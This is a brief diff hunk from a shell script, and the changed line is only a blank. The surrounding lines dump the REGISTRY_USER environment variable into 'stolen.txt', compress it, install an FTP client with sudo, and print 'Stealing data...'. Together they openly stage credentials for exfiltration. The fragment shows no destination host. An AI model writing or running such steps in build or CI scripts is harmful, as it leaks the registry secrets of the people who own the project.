@@ -5,6 +5,7 @@ printenv REGISTRY_USER
 printenv REGISTRY_USER >stolen.txt
 gzip stolen.txt
 
+
 sudo apt-get update
 sudo apt-get install -y ftp
 echo "Stealing data..."
